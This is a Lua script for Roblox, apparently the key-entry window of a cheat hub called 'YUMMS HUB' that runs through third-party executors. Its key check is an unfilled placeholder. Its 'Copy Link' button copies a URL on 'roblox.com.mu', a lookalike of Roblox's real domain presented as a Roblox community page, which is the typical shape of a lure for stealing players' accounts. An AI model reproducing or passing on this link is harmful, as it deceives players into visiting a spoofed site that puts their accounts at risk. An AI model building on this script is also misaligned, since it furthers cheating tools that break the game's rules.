--[[
    YUMMS HUB
    Key System
]]

repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer

local KeyLink = "https://www.roblox.com.mu/communities/1027078273/Yummscript"

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer

-- Clean old GUI
pcall(function()
    if gethui then
        for _, v in pairs(gethui():GetChildren()) do
            if v.Name == "YummsHubKeySystem" then
                v:Destroy()
            end
        end
    end
    if player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("YummsHubKeySystem") then
        player.PlayerGui.YummsHubKeySystem:Destroy()
    end
end)

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "YummsHubKeySystem"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.DisplayOrder = 999
screenGui.IgnoreGuiInset = true

if gethui then
    screenGui.Parent = gethui()
else
    screenGui.Parent = player:WaitForChild("PlayerGui")
end

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 420, 0, 280)
mainFrame.Position = UDim2.new(0.5, -210, 0.5, -140)
mainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

local mainStroke = Instance.new("UIStroke", mainFrame)
mainStroke.Color = Color3.fromRGB(60, 60, 80)
mainStroke.Thickness = 1.5

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.BackgroundTransparency = 1
title.Text = "YUMMS HUB"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 24
title.Font = Enum.Font.GothamBold
title.Parent = mainFrame

-- Key Box
local keyBox = Instance.new("TextBox")
keyBox.Size = UDim2.new(0, 360, 0, 42)
keyBox.Position = UDim2.new(0.5, -180, 0, 75)
keyBox.BackgroundColor3 = Color3.fromRGB(28, 28, 38)
keyBox.BorderSizePixel = 0
keyBox.PlaceholderText = "Enter your key here..."
keyBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 120)
keyBox.Text = ""
keyBox.TextColor3 = Color3.fromRGB(230, 230, 240)
keyBox.TextSize = 15
keyBox.Font = Enum.Font.Gotham
keyBox.ClearTextOnFocus = false
keyBox.Parent = mainFrame

Instance.new("UICorner", keyBox).CornerRadius = UDim.new(0, 8)
local boxStroke = Instance.new("UIStroke", keyBox)
boxStroke.Color = Color3.fromRGB(50, 50, 70)
boxStroke.Thickness = 1

-- Buttons Container
local buttonContainer = Instance.new("Frame")
buttonContainer.Size = UDim2.new(0, 360, 0, 45)
buttonContainer.Position = UDim2.new(0.5, -180, 0, 140)
buttonContainer.BackgroundTransparency = 1
buttonContainer.Parent = mainFrame

-- Check Key
local checkBtn = Instance.new("TextButton")
checkBtn.Size = UDim2.new(0, 170, 1, 0)
checkBtn.BackgroundColor3 = Color3.fromRGB(45, 120, 255)
checkBtn.BorderSizePixel = 0
checkBtn.Text = "Check Key"
checkBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
checkBtn.TextSize = 15
checkBtn.Font = Enum.Font.GothamBold
checkBtn.Parent = buttonContainer
Instance.new("UICorner", checkBtn).CornerRadius = UDim.new(0, 8)

-- Copy Link
local copyBtn = Instance.new("TextButton")
copyBtn.Size = UDim2.new(0, 170, 1, 0)
copyBtn.Position = UDim2.new(1, -170, 0, 0)
copyBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
copyBtn.BorderSizePixel = 0
copyBtn.Text = "Copy Link"
copyBtn.TextColor3 = Color3.fromRGB(220, 220, 230)
copyBtn.TextSize = 15
copyBtn.Font = Enum.Font.GothamBold
copyBtn.Parent = buttonContainer
Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 8)

-- Status
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -40, 0, 25)
statusLabel.Position = UDim2.new(0, 20, 0, 205)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = ""
statusLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
statusLabel.TextSize = 13
statusLabel.Font = Enum.Font.Gotham
statusLabel.Parent = mainFrame

-- Close Button
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -40, 0, 10)
closeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
closeBtn.BorderSizePixel = 0
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
closeBtn.TextSize = 16
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = mainFrame
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)

closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- Hover effects
local function addHover(btn, normal, hover)
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = normal}):Play()
    end)
end

addHover(checkBtn, Color3.fromRGB(45, 120, 255), Color3.fromRGB(70, 145, 255))
addHover(copyBtn, Color3.fromRGB(40, 40, 55), Color3.fromRGB(55, 55, 75))
addHover(closeBtn, Color3.fromRGB(40, 40, 55), Color3.fromRGB(60, 40, 40))

-- Clipboard
local function copyToClipboard(text)
    local success = pcall(function()
        if setclipboard then
            setclipboard(text)
        elseif toclipboard then
            toclipboard(text)
        elseif syn and syn.write_clipboard then
            syn.write_clipboard(text)
        else
            error("No clipboard")
        end
    end)
    return success
end

-- Copy Link
copyBtn.MouseButton1Click:Connect(function()
    if copyToClipboard(KeyLink) then
        statusLabel.Text = "Link copied!"
        statusLabel.TextColor3 = Color3.fromRGB(80, 220, 120)
    else
        statusLabel.Text = "Clipboard not supported"
        statusLabel.TextColor3 = Color3.fromRGB(255, 160, 60)
    end
    task.delay(3, function()
        if statusLabel and statusLabel.Parent then
            statusLabel.Text = ""
        end
    end)
end)

-- Check Key
checkBtn.MouseButton1Click:Connect(function()
    local key = keyBox.Text:gsub("%s+", "")
    if key == "" then
        statusLabel.Text = "Please enter a key!"
        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        return
    end

    statusLabel.Text = "Checking key..."
    statusLabel.TextColor3 = Color3.fromRGB(255, 200, 80)

    -- ====================== ADD YOUR REAL KEY CHECK HERE ======================
    -- Example:
    -- if key == "yourkey" then
    --     statusLabel.Text = "Key accepted!"
    --     statusLabel.TextColor3 = Color3.fromRGB(80, 220, 120)
    --     task.wait(1)
    --     screenGui:Destroy()
    --     -- load main script
    -- else
    --     statusLabel.Text = "Invalid key!"
    --     statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
    -- end
    -- ========================================================================

    task.wait(1)
    statusLabel.Text = "Replace this with real key check!"
    statusLabel.TextColor3 = Color3.fromRGB(255, 160, 60)
end)

-- Dragging
local dragging, dragStart, startPos = false, nil, nil

title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)

title.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

print("✅ YUMMS HUB loaded!")
